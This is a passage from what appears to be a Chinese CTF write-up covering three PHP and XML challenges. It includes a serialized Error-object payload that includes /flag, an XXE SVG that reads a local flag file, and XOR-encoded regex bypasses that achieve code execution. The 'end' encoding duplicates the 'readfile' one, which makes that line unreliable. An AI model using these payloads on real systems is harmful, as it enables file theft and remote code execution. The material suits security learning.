<p><code>使用含有 __toString 方法的php内置类来绕过，用的两个比较多的内置类是 Exception 和Error ，他们之中有一个 __toString 方法 ,当类被当作字符串处理时，就会调用这个函数</code></p>
<p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202406032212332.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>以字符串的形式 输出当前报错，包含当前的错误信息， 以及他出现错误的行号 (3)，但传入Error (“payload”,9)中的错误代码 “9 ” 则没有被输出出来</p>
<p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202406032213051.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p><code>可见 $a 和$b 这两个对象本身是不同的。但是 __toString 方法返回的结果是相同的，这里之所以需要在同一行是因为 __toString 返回的数据包含当前的行号</code></p>
<p>Exception 类与Error 类的使用和结果完全一样，只不过Exception 类适用于PHP 5和7 而Error 只适用于php7</p>
<p>思路：将题目代码中的$syc 和 $lover 分别声明为类似上面的内置类对象，让这两个对象本身不同 (传入的错误代码)， 但是 __toString 方法输出的结果相同即可。</p>
<p>preg_match 过滤了小括号，无法调用函数，构造<code>include &quot;/flag&quot;</code>,过滤了引号，我们直接用url 取反绕过。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SYCLOVER</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$syc</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lover</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>( (<span class="hljs-variable language_">$this</span>-&gt;syc != <span class="hljs-variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;syc) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;syc)=== <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;lover)) )&#123;<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="hljs-variable">$this</span>-&gt;syc, <span class="hljs-variable">$match</span>))&#123;<br>                <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;syc);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Try Hard !!&quot;</span>);<br>            &#125;<br><br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$m</span> = <span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-string">&#x27;/flag&#x27;</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;?&gt;&lt;?=include~&quot;</span>.<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$m</span>).<span class="hljs-string">&quot;?&gt;&quot;</span>;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-variable">$str</span>,<span class="hljs-number">1</span>);<span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-variable">$str</span>,<span class="hljs-number">2</span>);<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">SYCLOVER</span>();<br><span class="hljs-variable">$c</span>-&gt;syc = <span class="hljs-variable">$a</span>;<br><span class="hljs-variable">$c</span>-&gt;lover = <span class="hljs-variable">$b</span>;<br><span class="hljs-keyword">echo</span>(<span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$c</span>)));<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>注意版本为php7</p>
<p>payload：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://b596e779-<span class="hljs-number">564</span>c-<span class="hljs-number">4</span>d3e-<span class="hljs-number">9707</span>-b997850ea37d.node5.buuoj.cn:<span class="hljs-number">81</span>/?great=O%<span class="hljs-number">3</span>A8%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>SYCLOVER%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A2%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>syc%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A5%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>Error%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A7%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A10%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>message%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A20%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>E%<span class="hljs-number">3</span>C%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>Dinclude%<span class="hljs-number">7</span>E%D0%<span class="hljs-number">99</span>%<span class="hljs-number">93</span>%<span class="hljs-number">9</span>E%<span class="hljs-number">98</span>%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>E%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A13%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>Error%<span class="hljs-number">00</span>string%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A0%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A7%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>code%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bi%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A7%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>file%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A18%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>D%<span class="hljs-number">3</span>A%<span class="hljs-number">5</span>Cuntitled%<span class="hljs-number">5</span>C24.php%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A7%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>line%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bi%<span class="hljs-number">3</span>A18%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A12%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>Error%<span class="hljs-number">00</span>trace%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Ba%<span class="hljs-number">3</span>A0%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>B%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A15%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>Error%<span class="hljs-number">00</span>previous%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BN%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A5%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>lover%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A5%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>Error%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A7%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A10%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>message%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A20%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>E%<span class="hljs-number">3</span>C%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>Dinclude%<span class="hljs-number">7</span>E%D0%<span class="hljs-number">99</span>%<span class="hljs-number">93</span>%<span class="hljs-number">9</span>E%<span class="hljs-number">98</span>%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>E%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A13%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>Error%<span class="hljs-number">00</span>string%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A0%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A7%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>code%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bi%<span class="hljs-number">3</span>A2%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A7%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>file%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A18%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>D%<span class="hljs-number">3</span>A%<span class="hljs-number">5</span>Cuntitled%<span class="hljs-number">5</span>C24.php%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A7%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>line%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bi%<span class="hljs-number">3</span>A18%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A12%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>Error%<span class="hljs-number">00</span>trace%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Ba%<span class="hljs-number">3</span>A0%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>B%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A15%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>Error%<span class="hljs-number">00</span>previous%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BN%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D<br></code></pre></td></tr></table></figure>

<h2 id="BSidesCF-2019-SVGMagic"><a href="#BSidesCF-2019-SVGMagic" class="headerlink" title="[BSidesCF 2019]SVGMagic"></a>[BSidesCF 2019]SVGMagic</h2><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202406042110997.png" srcset="/img/loading.gif" lazyload alt="image-20240604210817856"></p>
<p>应该是上传svg文件然后转换为png文件</p>
<p>查下svg文件是什么</p>
<p>SVG，可缩放矢量图形（Scalable Vector Graphics），是一种用于描述二维图形的 XML 标记语言。</p>
<p>猜测为xxe漏洞</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">note</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///proc/self/cwd/flag.txt&quot;</span> &gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;100&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;1000&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">text</span> <span class="hljs-attr">x</span>=<span class="hljs-string">&quot;10&quot;</span> <span class="hljs-attr">y</span>=<span class="hljs-string">&quot;20&quot;</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">text</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span><br>// /proc/self/cwd 获取当前进程运行目录<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202406042128644.png" srcset="/img/loading.gif" lazyload alt="image-20240604212853558"></p>
<h2 id="ISITDTU-2019-EasyPHP"><a href="#ISITDTU-2019-EasyPHP" class="headerlink" title="[ISITDTU 2019]EasyPHP"></a>[ISITDTU 2019]EasyPHP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-variable">$_</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;_&#x27;</span>];<br><span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[\x00- 0-9\&#x27;&quot;`$&amp;.,|[&#123;_defgops\x7F]+/i&#x27;</span>, <span class="hljs-variable">$_</span>) )<br>  <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;rosé will not do it&#x27;</span>);<br><br><span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-title function_ invoke__">count_chars</span>(<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$_</span>), <span class="hljs-number">0x3</span>)) &gt; <span class="hljs-number">0xd</span> )<br>  <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;you are so close, omg&#x27;</span>);<br><br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>绕过两个if进行rce</p>
<p>查看正则匹配</p>
<p><a target="_blank" rel="noopener" href="https://regex101.com/">https://regex101.com/</a></p>
<p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202406051946914.png" srcset="/img/loading.gif" lazyload alt="image-20240605194601841"></p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm">\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>- <span class="hljs-number">0</span><span class="hljs-number">-9</span>                       匹配\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>到空格(\<span class="hljs-keyword">x</span><span class="hljs-number">20</span>)，<span class="hljs-number">0</span><span class="hljs-number">-9</span>的数字<br>&#x27;<span class="hljs-string">&quot;`$&amp;.,|[&#123;_defgops              匹配这些字符</span><br><span class="hljs-string">\x7F                            匹配DEL(\x7F)字符</span><br></code></pre></td></tr></table></figure>

<p>匹配以上字符直接die</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lisp">if ( <span class="hljs-name">strlen</span>(<span class="hljs-name">count_chars</span>(<span class="hljs-name">strtolower</span>($_), <span class="hljs-number">0</span>x3)) &gt; <span class="hljs-number">0</span>xd )<br>    die(&#x27;you are so close, omg&#x27;)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>

<p>不能提交超过13（&lt;&#x3D;13）种字符</p>
<p>没有过滤<code>~</code>和<code>^</code>字符，想到可以取反编码绕过和异或绕过<a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/104631142">关于PHP正则的一些绕过方法</a></p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">(~<span class="hljs-variable">%8</span>F<span class="hljs-variable">%97</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%96</span><span class="hljs-variable">%91</span><span class="hljs-variable">%99</span><span class="hljs-variable">%90</span>)()<span class="hljs-comment">;</span><br>#phpinfo()<span class="hljs-comment">;取反编码绕过</span><br></code></pre></td></tr></table></figure>

<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs llvm">final_string<span class="hljs-operator">=</span><span class="hljs-string">&quot;phpinfo&quot;</span><br>allowed<span class="hljs-operator">=</span><span class="hljs-string">&quot;!#%()*+-/:;&lt;=&gt;?@ABCHIJKLMNQRTUVWXYZ\]^abchijklmnqrtuvwxyz&#125;~&quot;</span><br>for a in final_string:    <br>    for i in allowed:<br>        for p in allowed:<br>            if <span class="hljs-keyword">ord</span>(i)^<span class="hljs-keyword">ord</span>(p)<span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-keyword">ord</span>(a):<br>                print(<span class="hljs-string">&quot;i=%s p=%s a=%s&quot;</span>%(i<span class="hljs-punctuation">,</span>p<span class="hljs-punctuation">,</span>a))<br>#暴力搜索符合条件的字符串，例如：phpinfo<span class="hljs-operator">=</span><span class="hljs-variable">%8</span>f<span class="hljs-variable">%97</span><span class="hljs-variable">%8</span>f<span class="hljs-variable">%96</span><span class="hljs-variable">%91</span><span class="hljs-variable">%99</span><span class="hljs-variable">%90</span>^<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>。<br></code></pre></td></tr></table></figure>

<p>查看phpinfo中的disable_functions</p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,<span class="hljs-keyword">system</span>,<span class="hljs-built_in">exec</span>,escapeshellarg,escapeshellcmd,passthru,proc_close,proc_get_status,proc_open,shell_exec,mail,imap_open,<br></code></pre></td></tr></table></figure>

<p>没有屏蔽print_r()和scandir()，可以打组合拳对系统目录和文件进行查看，但是还要考虑字符种类不能超过13的这个限制：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$_</span> = <span class="hljs-string">&quot;print_r(scandir(&#x27;.&#x27;));&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-title function_ invoke__">count_chars</span>(<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$_</span>), <span class="hljs-number">0x3</span>));<br><span class="hljs-comment">//返回15</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>需要缩减字符数</p>
<p><code>print_r</code>用异或表示即：</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm">&lt;?php<br>echo urlencode(&#x27;print_r&#x27; ^ urldecode(&#x27;<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>&#x27;))<span class="hljs-comment">;</span><br>//<span class="hljs-variable">%8</span>F<span class="hljs-variable">%8</span>D<span class="hljs-variable">%96</span><span class="hljs-variable">%91</span><span class="hljs-variable">%8</span>B<span class="hljs-variable">%A0</span><span class="hljs-variable">%8</span>D^<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><br></code></pre></td></tr></table></figure>

<p><code>scandir(.)</code>用异或表示即</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs llvm">&lt;?php<br>$a <span class="hljs-operator">=</span>  urlencode(&#x27;scandir&#x27; ^ urldecode(&#x27;<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>&#x27;))<span class="hljs-comment">;</span><br>$b <span class="hljs-operator">=</span> urlencode(&#x27;.&#x27; ^ urldecode(&#x27;<span class="hljs-variable">%ff</span>&#x27;))<span class="hljs-comment">;</span><br>echo $a.&#x27;^<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>&#x27;.&#x27;(&#x27;.$b.&#x27;^<span class="hljs-variable">%ff</span>&#x27;.&#x27;)&#x27;<span class="hljs-comment">;</span><br>//<span class="hljs-variable">%8</span>C<span class="hljs-variable">%9</span>C<span class="hljs-variable">%9</span>E<span class="hljs-variable">%91</span><span class="hljs-variable">%9</span>B<span class="hljs-variable">%96</span><span class="hljs-variable">%8</span>D^<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>(<span class="hljs-variable">%D1</span>^<span class="hljs-variable">%ff</span>)<br></code></pre></td></tr></table></figure>

<p>合起来</p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">print_r(scandir(.));=((%8F%8D%96%91%8B%A0%8D)^(%ff%ff%ff%ff%ff%ff%ff))(((%8C%9C%9E%91%9B%96%8D)^(%ff%ff%ff%ff%ff%ff%ff))(%D1^%ff));<br></code></pre></td></tr></table></figure>

<p>字符数超了</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">result2 = [<span class="hljs-number">0x8b</span>, <span class="hljs-number">0x9b</span>, <span class="hljs-number">0xa0</span>, <span class="hljs-number">0x9c</span>, <span class="hljs-number">0x8f</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x9e</span>, <span class="hljs-number">0xd1</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0x8c</span>]  # Original chars,<span class="hljs-number">11</span> total<br>result = [<span class="hljs-number">0x9b</span>, <span class="hljs-number">0xa0</span>, <span class="hljs-number">0x9c</span>, <span class="hljs-number">0x8f</span>, <span class="hljs-number">0x9e</span>, <span class="hljs-number">0xd1</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x8c</span>]  # to be deleted<br>temp = []<br>for d <span class="hljs-keyword">in</span> result2:<br>    for a <span class="hljs-keyword">in</span> result:<br>        for b <span class="hljs-keyword">in</span> result:<br>            for c <span class="hljs-keyword">in</span> result:<br>                if (a ^ b ^ c == d):<br>                    if a == b == c == d:<br>                        continue<br><span class="hljs-symbol">                    else:</span><br>                        print(<span class="hljs-string">&quot;a=0x%x,b=0x%x,c=0x%x,d=0x%x&quot;</span> % (a, b, c, d))<br>                        if d <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> temp:<br>                            temp<span class="hljs-number">.</span>append(d)<br>print(len(temp), temp)<br>#缩减字符数<br></code></pre></td></tr></table></figure>

<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">print_r(scandir(.));=((%9b%9c%9b%9b%9b%9b%9c)^(%9b%8f%9b%9c%9c%9b%8f)^(%8f%9e%96%96%8c%a0%9e)^(%ff%ff%ff%ff%ff%ff%ff))(((%9b%9b%9b%9b%9b%9b%9c)^(%9b%9b%9b%9c%a0%9b%8f)^(%8c%9c%9e%96%a0%96%9e)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));<br></code></pre></td></tr></table></figure>

<p>将其传入得到当前目录的文件：</p>
<blockquote>
<p>Array ( [0] &#x3D;&gt; . [1] &#x3D;&gt; .. [2] &#x3D;&gt; index.php [3] &#x3D;&gt; n0t_a_flAg_FiLe_dONT_rE4D_7hIs.txt )</p>
</blockquote>
<p>用end()返回数组的最后一项：</p>
<p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202406052121580.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>构造readfile(end(scandir(.)))即可。</p>
<p><code>readfile</code>用异或表示即：</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">(<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>A<span class="hljs-variable">%9</span>E<span class="hljs-variable">%9</span>B<span class="hljs-variable">%99</span><span class="hljs-variable">%96</span><span class="hljs-variable">%93</span><span class="hljs-variable">%9</span>A)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>)<br></code></pre></td></tr></table></figure>

<p><code>end</code>用异或表示即：</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">(<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>A<span class="hljs-variable">%9</span>E<span class="hljs-variable">%9</span>B<span class="hljs-variable">%99</span><span class="hljs-variable">%96</span><span class="hljs-variable">%93</span><span class="hljs-variable">%9</span>A)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>)<br></code></pre></td></tr></table></figure>

<p>因此，readfile(end(scandir(.)))正常合起来，又经过替代后可得：</p>
